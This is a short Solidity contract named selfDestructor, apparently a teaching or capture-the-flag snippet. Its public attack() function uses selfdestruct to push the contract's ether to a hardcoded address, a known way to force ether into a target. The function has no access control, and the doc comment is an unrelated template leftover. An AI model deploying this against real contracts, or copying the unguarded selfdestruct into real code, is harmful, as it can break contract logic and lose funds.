// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.7.0 <0.9.0;

import "hardhat/console.sol";

/**
 * @title Owner
 * @dev Set & change owner
 */
contract selfDestructor {
    uint balance = 0;

    function recieve() payable public {
        balance+=(msg.value);
    }
    function attack() public {

    selfdestruct(payable(0x501A62d87736ECfBBF4dBD4d9725186A4ff9eFCe));
    
    }

} 